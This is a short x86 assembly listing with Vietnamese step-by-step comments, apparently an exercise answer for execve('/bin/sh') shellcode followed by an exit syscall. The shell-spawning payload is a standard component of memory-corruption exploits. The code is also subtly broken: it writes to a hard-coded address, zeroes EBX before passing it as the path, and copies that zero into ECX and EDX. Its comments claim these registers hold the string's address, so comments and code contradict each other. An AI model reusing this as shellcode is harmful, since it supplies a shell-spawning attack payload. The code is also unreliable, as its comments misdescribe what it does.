section .data
    shellcode db "/bin/sh",0
    shellcode_len equ $ - shellcode

section .text
    global _start

_start:
    ; Bước a: Lưu trữ chuỗi "/bin/sh" kết thúc bằng null vào bộ nhớ
    mov edi, 0x804a000  ; Địa chỉ bộ nhớ để lưu trữ chuỗi
    mov esi, shellcode
    mov ecx, shellcode_len
    cld
    rep movsb

    ; Bước b: Lưu trữ địa chỉ của chuỗi "/bin/sh" và từ null vào bộ nhớ
    mov ebx, edi        ; Địa chỉ của chuỗi "/bin/sh"
    mov ecx, dword [edi + 4]  ; Địa chỉ từ null

    ; Bước c: Sao chép giá trị 0xb vào thanh ghi EAX
    xor eax, eax
    mov al, 0xb

    ; Bước d: Sao chép địa chỉ của chuỗi "/bin/sh" vào thanh ghi EBX
    xor ebx, ebx
    mov ebx, ebx

    ; Bước e: Sao chép địa chỉ của chuỗi "/bin/sh" vào thanh ghi ECX
    xor ecx, ecx
    mov ecx, ebx

    ; Bước f: Sao chép địa chỉ của từ null vào thanh ghi EDX
    xor edx, edx
    mov edx, ecx

    ; Bước g: Thực thi lệnh "int 0x80"
    int 0x80

    ; Bước h: Sao chép giá trị 0x1 vào thanh ghi EAX
    xor eax, eax
    mov al, 0x1

    ; Bước i: Sao chép giá trị 0x0 vào thanh ghi EBX
    xor ebx, ebx

    ; Bước j: Thực thi lệnh "int 0x80"
    int 0x80